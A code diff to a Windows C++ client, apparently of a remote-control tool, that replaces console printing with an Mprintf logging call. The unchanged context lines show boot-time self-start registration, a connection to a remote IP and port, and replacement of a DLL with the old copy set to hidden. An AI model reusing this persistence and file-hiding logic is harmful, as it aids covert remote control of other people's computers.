@@ -109,7 +109,7 @@ int main(int argc, const char *argv[])
 {
 	if (!SetSelfStart(argv[0], REG_NAME))
 	{
-		std::cout << "设置开机自启动失败，请用管理员权限运行.\n";
+		Mprintf("设置开机自启动失败，请用管理员权限运行.\n");
 	}
 
 	status = E_RUN;
@@ -127,18 +127,18 @@ int main(int argc, const char *argv[])
 		g_SETTINGS.SetServer(argv[1], atoi(argv[2]));
 	}
 	if (strlen(g_SETTINGS.ServerIP())==0|| g_SETTINGS.ServerPort()<=0)	{
-		printf("参数不足: 请提供远程主机IP和端口!\n");
+		Mprintf("参数不足: 请提供远程主机IP和端口!\n");
 		Sleep(3000);
 		return -1;
 	}
-	printf("[server] %s:%d\n", g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort());
+	Mprintf("[server] %s:%d\n", g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort());
 
 	// 获取当前模块的句柄（HINSTANCE） 
 	g_hInstance = GetModuleHandle(NULL); 
 	if (g_hInstance != NULL) {
-		std::cout << "HINSTANCE: " << g_hInstance << std::endl;
+		Mprintf("HINSTANCE: %p\n", g_hInstance);
 	} else {
-		std::cerr << "Failed to get HINSTANCE" << std::endl;
+		Mprintf("Failed to get HINSTANCE!\n");
 	}
 
 	do{
@@ -225,12 +225,12 @@ void RunNewDll(const char* cmdLine) {
 		{
 			if (!DeleteFileA(oldFile.c_str()))
 			{
-				std::cerr << "Error deleting file. Error code: " << GetLastError() << std::endl;
+				Mprintf("Error deleting file. Error code: %d\n", GetLastError());
 				ok = FALSE;
 			}
 		}
 		if (ok && !MoveFileA(path, oldFile.c_str())) {
-			std::cerr << "Error removing file. Error code: " << GetLastError() << std::endl;
+			Mprintf("Error removing file. Error code: %d\n", GetLastError());
 			if (_access(path, 0) != -1)
 			{
 				ok = FALSE;
@@ -240,15 +240,15 @@ void RunNewDll(const char* cmdLine) {
 			// 设置文件属性为隐藏
 			if (SetFileAttributesA(oldFile.c_str(), FILE_ATTRIBUTE_HIDDEN))
 			{
-				std::cout << "File created and set to hidden: " << oldFile << std::endl;
+				Mprintf("File created and set to hidden: %s\n", oldFile.c_str());
 			}
 		}
 		if (ok && !MoveFileA(newFile.c_str(), path)) {
-			std::cerr << "Error removing file. Error code: " << GetLastError() << std::endl;
+			Mprintf("Error removing file. Error code: %d\n", GetLastError());
 			MoveFileA(oldFile.c_str(), path);// recover
 		}
 		else if (ok) {
-			std::cout << "Using new file: " << newFile << std::endl;
+			Mprintf("Using new file: %s\n", newFile.c_str());
 		}
 	}
 	char cmd[1024];
@@ -331,7 +331,7 @@ DWORD WINAPI StartClient(LPVOID lParam)
 			Sleep(200);
 	}
 
-	cout<<"StartClient end\n";
+	Mprintf("StartClient end\n");
 	delete ClientObject;
 	g_bThreadExit = true;
 
